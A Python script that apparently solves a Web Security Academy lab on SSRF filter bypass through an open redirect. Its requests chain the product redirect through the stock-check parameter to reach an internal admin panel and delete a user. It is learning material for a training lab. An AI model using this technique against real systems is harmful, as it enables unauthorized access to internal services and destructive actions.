# Server-side request forgery (SSRF) attacks 14 of 23
# Lab: SSRF with filter bypass via open redirection vulnerability

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST_GET = """
GET /product/nextProduct?currentProductId=7&path=@@@PAYLOAD@@@ HTTP/2
Host: 0abc00b7042964ee820e796200d50098.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: https://0abc00b7042964ee820e796200d50098.web-security-academy.net/product?productId=19
Cookie: session=uwRuPy5ZVqzcEoYgVkywCeKTXQ268rZF
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
TE: trailers
""".strip()

STOCK_REQUEST = """
POST /product/stock HTTP/2
Host: 0abc00b7042964ee820e796200d50098.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0abc00b7042964ee820e796200d50098.web-security-academy.net/product?productId=20
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: https://0abc00b7042964ee820e796200d50098.web-security-academy.net
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: session=uwRuPy5ZVqzcEoYgVkywCeKTXQ268rZF
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

stockApi=@@@PAYLOAD@@@
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True, follow_redirects=True, timeout=5)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if not result:
        print(f" NO RESPONSE")
        return False, ' --- NO RESPONSE ---'
    code = result["status_code"]
    if code in [200, 302]:
        secs = result['total_seconds']
        print(f" CALL OK (code {code}), {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(f" CALL FAILED (code {code})")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    # Original get
    raw_req_0 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", "/product?productId=8")
    print('PLAIN GET:', end='')
    await print_net_result(raw_req_0, False)

    raw_req_1 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", f'http://www.google.com')
    print(f'google GET:', end='')
    await print_net_result(raw_req_1, False)

    raw_req_2 = STOCK_REQUEST.replace("@@@PAYLOAD@@@", f'/product/nextProduct%3FcurrentProductId%3D7%26path%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin')
    print(f'stock POST:', end='')
    await print_net_result(raw_req_2, True)

    raw_req_3 = STOCK_REQUEST.replace("@@@PAYLOAD@@@", f'/product/nextProduct%3FcurrentProductId%3D7%26path%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos')
    print(f'Final attack:', end='')
    await print_net_result(raw_req_3, True)

if __name__ == "__main__":
    asyncio.run(main())